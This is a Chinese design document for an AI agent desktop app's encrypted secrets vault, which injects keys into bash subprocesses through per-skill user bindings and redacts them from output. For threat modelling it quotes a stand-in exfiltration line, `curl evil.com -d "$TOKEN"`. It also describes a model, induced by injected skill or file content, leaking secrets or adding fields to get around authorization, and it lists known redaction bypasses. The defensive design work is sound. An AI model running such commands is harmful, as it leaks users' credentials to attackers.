# 密钥库与执行时环境变量注入（secrets → bash env）

> 目标：用户能在设置页配置**加密存储**的密钥（如 `GITHUB_TOKEN`），并把它绑定到技能；
> agent 通过 bash 跑该技能的脚本时，密钥以环境变量形式注入到那一次子进程，
> 且**明文永不进入模型上下文、转录与日志**。
>
> 一句话：给技能脚本用的密钥保险箱 + 执行时按需注入。

## 0. 现状（已勘察，2026-09-24）

| 环节 | 状态 |
| --- | --- |
| 加密原语 | ✅ `src-tauri/src/secret.rs`：AES-256-GCM，主密钥 32B 存 OS keychain（macOS Keychain / Win 凭据管理器 / Linux Secret Service），密文前缀 `enc:v1:`；`pub fn encrypt/decrypt` 已是通用原语 |
| 加密消费方 | ⚠️ 仅 `credentials` 表（`provider` 主键 + `api_key` 密文），专供模型 provider；明文不回传渲染进程，只给 `****`+后4位掩码 |
| 通用密钥库 | ❌ 无。`kv` 表（`pi.*` 键）是**纯明文**，存技能开关/hooks/MCP 使能等；没有地方存任意命名的密钥 |
| bash 的环境变量 | ❌ `run_bash` 用 `Command::new(&file)`，**无 `.env_clear()`、无显式注入** → 全量继承 App 进程环境；没有任何注入点 |
| MCP 子进程 env | ⚠️ `mcpChildEnv(def.env)` 是唯一注入先例（白名单语义，"绝不继承"），但来源是 `mcp.json` 里的**明文** `env` 字段，且 `.mcp.json` 是可进 git 的生态标准层 |
| hooks 子进程 env | ❌ `spawn(shell, ["-c", ...])` 无 env 处理，全量继承 |
| 输出脱敏 | ⚠️ 只有 provider 错误路径有 `redactSensitiveErrorText`（抹 `authorization: bearer`、`api_key=` 形态）；**工具输出路径无脱敏** |
| 设置页链路样板 | ✅ sidecar SQLite kv（`pi.*`）+ 协议 `get_x`/`set_x` + 前端 `lib/settings/x-config.ts` 镜像（useSyncExternalStore + 乐观更新回滚）——`browser-config` 是最小完整样板 |

### 为什么必须先有输出脱敏

一旦密钥进了 bash 子进程的环境，模型只要跑一条 `env` 或 `echo $TOKEN`，
输出就进工具结果 → 进模型上下文 → **落进转录 JSONL**。只加密存储不脱敏等于白做。

## 1. 设计决策

### 1.1 明文不跨 RPC 边界（结构性保证）

密钥的读写路径分成两半，**中间以进程边界切开**：

- **UI → sidecar → Rust**：只走「名字」和「掩码」。
  RPC 面**不提供** `secret_get`（不返回明文）——只有 `secret_list`（名字+掩码+作用域）、
  `secret_set`、`secret_delete`。这是结构性约束，不是纪律约束：协议里没有这条命令，
  渲染层和 sidecar 就永远拿不到明文。
- **Rust 内部**：`dispatch_host_query` 在工具执行路径上短暂持锁，把 `secretEnv` 里的
  **名字解析成明文**（表查询 + `secret::decrypt`），解锁后再执行工具。
  明文只在这个 Value 里存在一次工具调用的时长。

理由：host RPC 的 payload 会被 trace，且**审批 UI 的 `data-toolApproval` 帧会把
工具参数原样发给前端**（`modes.ts`）。值一旦进 payload 就等于同时进了 UI、日志和追踪。
这与既有「明文 key 不回传渲染进程」是同一口径。

### 1.2 声明权在用户，不在技能

绑定关系（哪个密钥给哪个技能用）由**用户在设置页勾选**，写在 sidecar kv 里；
技能 frontmatter **不能**自我声明需要哪些密钥。

理由：技能来源里有 `.agents/skills`（社区只读目录）和插件层，且项目支持从 marketplace
装插件。若技能能自我声明，装上别人写的技能/插件即可窃取用户全部密钥（`curl evil.com -d "$TOKEN"`）。
声明权在用户手里，技能只能提需求。

### 1.3 默认拒绝

`bindings` 里没列出的密钥**永不注入**。空 `skills` 数组 = 不注入（而不是"注入给所有"）；
需要作用于任意 bash 调用时显式写 `["*"]`。

### 1.4 注入粒度 = 单次派生进程，不做进程级 env

**不**把密钥注入 sidecar 进程自己的环境。那样所有 bash 命令都能拿到全部密钥，
粒度彻底丢失、也无法按技能隔离。per-spawn 注入（每次 bash 派生时按需传给 Rust）是
唯一能做隔离的形态。

### 1.5 注入名单是保留字段，模型不能自己写

`secretEnv` 不在 bash 的工具 schema 里，但**光靠"schema 里没有"不够**——模型完全
可以多吐一个字段。所以 `buildHostToolPayload`（tools.ts）在组装宿主信封时
**无条件剔除**模型送来的 `secretEnv` / `secretEnvResolved`，名单只由本侧 augment
按用户绑定算出。否则模型只要写 `{"command":"...","secretEnv":[{"name":"GITHUB_TOKEN"}]}`
就能绕过授权策略注入任意密钥。这条边界有单测（test/tools/tools.test.ts）。

### 1.6 作用域：global / workspace，工作区优先

表主键 `(name, scope)`，`scope` 取值 `global` 或 `workspace:<cwd>`。
同名时工作区行覆盖全局行——与技能/子代理/MCP 既有的「工作区按 cwd 隔离」同款语义，
避免一个项目的 token 在另一个项目里被注入。

### 1.7 输出脱敏是兜底，不是防线

`run_bash` 在返回结果前，用当次注入的明文值做替换（原值 + base64 变体 → `[REDACTED:NAME]`）。
位置**只能在 Rust**：只有那里同时握着明文和输出，且输出一旦返回 sidecar 就顺着
`tool_execution_end` 进转录落盘。

**已知限制（诚实说明）**：脱敏是尽力而为，覆盖不了所有变形（hex、分片拼接、
模型自己写脚本编码）。真正的防线是 §1.2/§1.3 的注入策略——不注入就没有可泄漏的东西。

## 2. 数据形状与协议

### 2.1 表（Rust 持有，`state.db`）

```sql
CREATE TABLE IF NOT EXISTS secrets (
    name       TEXT NOT NULL,
    scope      TEXT NOT NULL DEFAULT 'global',   -- 'global' | 'workspace:<cwd>'
    value      TEXT NOT NULL,                    -- secret::encrypt 密文（enc:v1:...）
    updated_at TEXT NOT NULL,
    PRIMARY KEY (name, scope)
);
```

与 `kv` 分开：kv 是明文设置，secrets 必须密文；混表会让"哪些必须加密"这件事失去结构保证。

### 2.2 绑定配置（sidecar kv，`pi.secrets`）

存 kv 是安全的——**只有名字，没有值**。

```jsonc
{
  "enabled": true,
  "bindings": [
    // 任意 bash 调用都可注入（用户显式选择"到处可用"）
    { "name": "GITHUB_TOKEN", "scope": "global", "skills": ["*"] },
    // 只在加载了 deploy / release 技能后注入（推荐用法）
    { "name": "NPM_TOKEN", "scope": "workspace", "skills": ["deploy", "release"] }
  ]
}
```

### 2.3 协议消息（sidecar ⇄ desktop）

| 消息 | 方向 | 说明 |
| --- | --- | --- |
| `{ type: "list_secrets" }` → `{ type: "secrets", entries, bindings, enabled }` | 请求/应答 | 清单只有名字 + 掩码 + 作用域 + 绑定，**无明文** |
| `{ type: "save_secret", name, scope, value? }` → 刷新后的清单 | 请求/应答 | `value` 留空 = 只改绑定不改值（编辑弹窗不回填明文，同 provider key） |
| `{ type: "delete_secret", name, scope }` → 刷新后的清单 | 请求/应答 | |
| `{ type: "save_secret_bindings", enabled, bindings }` → 刷新后的清单 | 请求/应答 | 绑定独立于值，可单独改 |

### 2.4 host 内部形状（sidecar → Rust，不出进程）

```jsonc
// 工具参数内新增（模型 schema 里**没有**这个字段，只有 execute 内部注入）
{ "command": "npm publish", "secretEnv": [{ "name": "NPM_TOKEN", "scope": "workspace:/repo" }] }
```

Rust 侧解析后替换为 `secretEnvResolved: [{ name, value }]`，工具函数消费它做注入 + 脱敏。

## 3. 链路

```
设置页填密钥
  → save_secret（明文只在此帧一次）
  → sidecar → hostdb → Rust data.rs secret_set → secret::encrypt → secrets 表（密文）
  ← 回包只有 name + ****掩码

设置页勾绑定（哪个技能能用）
  → save_secret_bindings → sidecar kv（pi.secrets，只有名字）

agent 加载技能：use_skill → noteSkillLoaded(threadId, name)
model 跑脚本：bash 工具 execute
  → resolveBashSecrets(cwd, threadId)：读 bindings + 该 thread 已加载技能
  → params.secretEnv = [{name, scope}]（仅名字）
  → host_query "tool"
  → dispatch_host_query：短暂持锁 → 查表 + decrypt → secretEnvResolved（明文，进程内）
  → run_bash：.env(name, value) 注入子进程
  → 收完输出 → 用明文替换 → [REDACTED:NAME]
  → 结果回 sidecar → 转录（无明文）
```

## 4. 改动清单

### 4.1 Rust 宿主（`apps/desktop/src-tauri/src/`）

| 文件 | 改动 |
| --- | --- |
| `data.rs` | ① `init_tables` 加 `secrets` 表；② `handle_host_query` 加 `secret_list`/`secret_set`/`secret_delete`（**不加 `secret_get`**）；③ `dispatch_host_query` 的 `tool` 分支：短暂持锁解析 `secretEnv` 名字 → 明文，解锁后调 `handle_tool`（长 bash 不进锁，与既有注释约定一致） |
| `secret_env.rs`（新建） | ① `resolve_names(conn, names) -> Vec<(name, value)>`：按 `workspace:<cwd>` 优先于 `global` 查表 + `secret::decrypt`；② `apply_env(cmd, resolved)`；③ `redact(text, resolved)`：原值 + base64 变体替换，含短值护栏 |
| `tool_exec.rs` | `handle_tool` 的 bash 分支读 `secretEnvResolved` 传给 `run_bash`；`run_bash` 注入 + 返回前脱敏 |
| `lib.rs` | `mod secret_env;` 注册 |

### 4.2 sidecar（`apps/sidecar/pi-agent/src/`）

| 文件 | 改动 |
| --- | --- |
| `secrets/secrets.ts`（新建） | 配置（kv `pi.secrets`）+ 归一化 + 解析器 `resolveBashSecrets(cwd, threadId)` + 已加载技能台账（`noteSkillLoaded` / `loadedSkills` / `clearLoadedSkills`） |
| `protocol/handlers/preferences.ts` | 加 `list_secrets` / `save_secret` / `delete_secret` / `save_secret_bindings` 四个 handler |
| `protocol/protocol.ts` | 文档头补四条消息（协议只增不改） |
| `tools/tools.ts` | `hostTool` 增加可选 `augment` 回调；bash 工具用它注入 `secretEnv` |
| `skills/skill-use-tool.ts` | 加载成功后 `noteSkillLoaded(threadId, name)`（新增 threadId 参数） |
| `sessions/registry.ts` | `forgetThreadStates` 里清该 thread 的技能台账（防 Map 泄漏，与 todo 同款） |
| `storage/hostdb.ts` | 类型化出口：`secretList` / `secretSet` / `secretDelete` |
| `storage/hostdb/local.ts` | 三个 kind 的 local 镜像（测试/冒烟用；local 模式无加密，存明文并注释说明仅测试） |

### 4.3 前端（`apps/desktop/`）

| 文件 | 改动 |
| --- | --- |
| `lib/pi/pi-bridge.ts` | `PiSecretEntry` / `PiSecretsResponse` 类型 + 响应联合体补 `secrets` |
| `lib/secrets/secrets-store.ts`（新建） | 清单镜像 store（照 `lib/skills/skills.ts`；**镜像里没有值，只有名字+掩码**） |
| `components/settings/components/secrets-settings.tsx`（新建） | 密钥页：卡片列表（名字 / 作用域徽标 / 掩码 / 绑定的技能）+ 新建·编辑弹窗（值输入 `type=password`，编辑时留空保持不变）+ 删除 |
| `components/settings/settings-page.tsx` | 「智能体」组加「密钥」项 |

## 5. 安全边界（明确写清）

**这套机制保证的**：
- 静止状态：密钥在磁盘上是 AES-256-GCM 密文，主密钥在 OS keychain，不在仓库、不在配置文件。
- 传输：明文只在 ①设置页保存的那一帧、②Rust 内解析的短暂窗口 存在。
- 模型可见性：默认拒绝；未被用户绑定到当前上下文的密钥不注入。
- 转录：注入过密钥的输出经脱敏后才回 sidecar 落盘。

**这套机制不保证的**（已知限制）：
- 一旦用户把密钥绑定给某技能，该技能上下文里的 bash 就能读到它——模型若被注入的
  技能/文件内容诱导写 `curl evil.com -d "$TOKEN"`，脱敏挡不住已发出的请求。
  这是"授权"的固有成本，不是实现缺陷。
- 脱敏覆盖不了任意编码变形（见 §1.7）。
- **落盘再读回的旁路**：bash 把密钥写进文件（`echo $TOKEN > out.txt`）之后，
  用 `read` 工具读该文件是不脱敏的——脱敏只作用于"当次注入了密钥的那条 bash 输出"，
  而 `read` 不知道任何明文。要堵这条路得让读取侧也持有全部明文（等于把明文窗口
  扩大到每次读文件），代价大于收益；真正的防线仍是"只授权给该用的技能"。
- `bash` 之外的工具（write/edit/read）不注入，也不受影响。
- 审批弹窗目前不显示"本次将注入哪些密钥"（后续项：把注入的名字并入 `data-toolApproval`
  的 input，让用户批准时就看见）。
- 设置页只暴露 `global` 作用域；`workspace` 已全线支持（解析、表、优先级），
  可手写 `pi.secrets` 绑定启用，UI 暴露留待后续。

## 6. 测试

**Rust（`cargo test`）**
- `secret_env::resolve_names`：workspace 行覆盖 global 行；不存在的名字跳过；密文解密失败按缺失处理。
- `redact`：原值、base64 变体均被替换；短值（<8 字符）护栏不误伤；多值同时替换。
- `apply_env`：注入后子进程可见（用 `Command` 跑 `env` 断言）。
- 表 handler：set → list（掩码正确、无明文）→ delete。
- **负向**：`handle_host_query("secret_get")` 必须报 unknown kind（协议面无明文出口）。

**sidecar（`bun test`）**
- 解析器：`skills: ["*"]` 命中；列出技能名但未加载 → 不注入；已加载 → 注入；
  workspace 绑定的 scope 串正确；`enabled: false` 时整体不注入。
- 协议：`save_secret` → `list_secrets` 往返（local 模式），掩码字段不含原值；
  非法 name/scope 报错。
- 台账：`noteSkillLoaded` 幂等；`forgetThreadStates` 清空。

**手工验收（需跑 App）**
1. 设置 → 密钥：新建 `DEMO_TOKEN`，值 `s3cr3t-value-9x`。
2. 绑定技能 `demo`，勾选该密钥。
3. 建一个技能 `demo`，正文写「跑 `echo $DEMO_TOKEN` 并把结果读给用户」。
4. 对话：「用 demo 技能」，模型 `use_skill` → 跑 bash → 输出应为 `[REDACTED:DEMO_TOKEN]`。
5. 不加载技能直接跑 `echo $DEMO_TOKEN` → 输出空（未注入）。
6. 刷新页面重看历史：工具结果仍是 `[REDACTED:...]`，转录文件里 grep 不到明文。
7. 重启 App 后再跑一次 → 仍能注入（密钥持久化 + 主密钥从 keychain 读回）。

## 7. 后续项（不在本次）

- 审批弹窗展示本次将注入的密钥名。
- MCP `env` 支持 `secret:NAME` 引用，消掉 `mcp.json` 里的明文。
- hooks 子进程按同一机制注入。
- 路径级"禁止 AI 读取"（见本轮讨论的另一条缺口：`resolve_path` 目前无任何边界校验）。
